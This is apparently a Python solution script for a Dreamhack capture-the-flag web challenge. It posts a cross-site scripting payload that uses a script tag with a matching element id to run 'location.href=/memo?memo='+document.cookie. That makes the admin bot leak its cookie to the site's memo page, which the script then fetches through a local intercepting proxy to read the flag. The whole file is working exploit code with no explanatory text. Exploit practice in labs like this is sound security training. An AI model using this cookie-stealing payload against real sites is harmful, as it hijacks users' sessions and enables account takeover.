import requests
from bs4 import BeautifulSoup

TARGET = 'http://host3.dreamhack.games:20429'
PAYLOAD = {
    'param':'<script id="name"></script>',
    'name':"location.href='/memo?memo='+document.cookie//"

}
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

try:
    req = requests.post(TARGET + '/flag', proxies=PROXIES, data=PAYLOAD, timeout=5)
except Exception as e:
    print(e)

flag = requests.get(TARGET + '/memo', proxies=PROXIES, timeout=5)

soup = BeautifulSoup(flag.text, features='html.parser')
print(soup)





